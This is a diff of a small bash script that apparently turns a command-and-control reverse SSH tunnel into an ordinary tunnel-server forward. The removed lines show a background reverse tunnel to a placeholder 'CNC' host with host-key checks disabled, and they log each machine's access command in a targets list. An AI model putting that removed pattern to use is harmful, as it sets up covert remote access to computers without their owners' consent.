@@ -1,12 +1,12 @@
 #!/bin/bash
 
-CNC="test@test.com"
+TUNNELSERVER="test@test.com"
 
-ssh -o BatchMode=yes -o ExitOnForwardFailure=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -f -N -R $2:localhost:$1 $CNC 
+# Start local forward and run script on tunnel server
+ssh -f -N -L $1:localhost:22 $TUNNELSERVER
+ssh $TUNNELSERVER "echo bash ~/tunnelport.sh $1"
 
 if [ "$?" -eq 0 ]; then
-  # Save command to access target on CNC server
-  ssh $CNC "echo ssh -p $2 `hostname -s`@localhost >> ~/targets "
   exit 0
 else
   echo connection failed
